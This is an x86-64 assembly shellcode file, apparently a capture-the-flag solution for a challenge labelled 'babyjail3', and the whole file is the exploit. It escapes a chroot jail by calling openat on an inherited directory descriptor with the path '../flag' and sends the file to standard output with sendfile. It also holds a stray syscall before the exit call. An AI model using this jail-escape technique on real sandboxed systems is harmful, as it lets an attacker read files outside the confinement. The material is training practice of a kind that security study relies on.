.global _start
.intel_syntax noprefix
_start:
  # babyjail3
	# call openat using the opened file descriptor previously
	mov rax, 257
	mov rdi, 3
	lea rsi, [rip+path]
	mov rdx, 0
	syscall

	# call sendfile to read the flag file
	mov rdi, 1
	mov rsi, rax
	mov rdx, 0
	mov r10, 1024
	mov rax, 40
	syscall

	# exit cleanly to help debug because dont crash
	syscall
	mov rax, 60
	syscall

path:
	.string "../flag"
